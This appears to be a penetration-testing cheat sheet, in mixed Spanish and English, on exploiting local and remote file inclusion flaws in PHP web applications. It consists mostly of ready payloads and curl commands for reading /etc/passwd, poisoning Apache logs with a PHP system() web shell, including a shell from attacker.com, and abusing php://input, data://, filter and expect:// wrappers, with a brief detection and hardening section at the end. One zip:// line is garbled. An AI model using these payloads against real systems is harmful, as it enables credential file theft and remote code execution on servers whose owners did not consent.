---
title: LFI/RFI
phase: explotacion
platform: web
tags: [lfi, rfi, file-inclusion, web]
risk: high
attack_tactic: TA0002
attack_technique: T1190
data_sources: [web-server-logs, ids-ips, waf-logs]
last_review: 2026-05-25
---

# Local and Remote File Inclusion

### Objetivo

Explotar vulnerabilidades de inclusión de archivos para leer archivos sensibles del sistema o ejecutar código remoto.

### LFI Basic Payloads

```bash
# Basic
?page=../../../../etc/passwd

# Null byte
?page=../../../../etc/passwd%00

# Double encoding
?page=%252e%252e%252fetc%252fpasswd

# Path traversal wrappers
?page=....//....//....//etc/passwd
?page=/etc/passwd/././././././././
```

### LFI to RCE

```bash
# Via /proc/self/environ
curl "http://target.com/?page=../../../../proc/self/environ"

# User-Agent injection
curl -A "<?php system($_GET['cmd']); ?>" "http://target.com/?page=../../../../proc/self/environ"

# Via log injection
# First inject into Apache access log
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
# Then include log
curl "http://target.com/?page=../../../../var/log/apache2/access.log&cmd=whoami"
```

### RFI (Remote File Inclusion)

```bash
# Requires allow_url_include = On
?page=http://attacker.com/shell.txt

# Wrap in PHP wrapper
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

### PHP Wrapper Exploits

```bash
# php://input
curl -d "<?php system('id'); ?>" "http://target.com/?page=php://input"

# php://filter
curl "http://target.com/?page=php://filter/convert.base64-encode/resource=/etc/passwd"

# data://
curl "http://target.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpOyA/Pg=="

# zip://
echo "<?php system('id'); ?>" > payload.php
zip:// shell.zip
```

### One-liners

```bash
# LFI to RCE via session files
find /var/lib/php/sessions/ -name "sess_*" 2>/dev/null
curl "http://target.com/?page=/var/lib/php/sessions/sess_FILEID"

# Filter wrappers
curl "http://target.com/?page=expect://whoami"
```

### Detección y Mitigación

- **Visibilidad:** Monitor web logs for path traversal patterns, /proc/self access, wrappers usage.
- **Hardening:** Disable allow_url_include, use whitelist for file inclusion, sanitize inputs, disable dangerous wrappers.

### Validación de Cobertura

- **Prueba técnica:** Test for path traversal, include /etc/passwd.
- **Criterio de éxito:** WAF blocks path traversal attempts; web app uses safe file inclusion.
